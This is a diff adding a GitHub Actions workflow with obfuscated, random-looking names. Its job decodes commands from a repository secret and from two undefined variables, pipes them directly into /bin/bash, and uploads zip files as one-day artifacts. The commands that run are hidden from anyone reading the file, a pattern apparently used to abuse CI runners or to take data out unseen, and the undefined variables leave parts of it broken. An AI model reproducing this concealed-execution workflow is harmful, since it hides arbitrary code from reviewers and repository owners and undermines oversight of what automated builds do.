@@ -1,0 +1,23 @@
+name: laura5912beginner
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: laura5912beginner
+        env:
+          ov740: ${{ secrets.ov740 }}
+        run: |
+          printf '%s' "$ov740" | jq -r .pro03 | /bin/bash
+          echo $vp97954 | jq -r .hbxyo03363 | /bin/bash
+          printf '%s' "$myrl03" | jq -r .sfmg253 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6yAEh2kD
+          path: "*.zip"
+          retention-days: 1
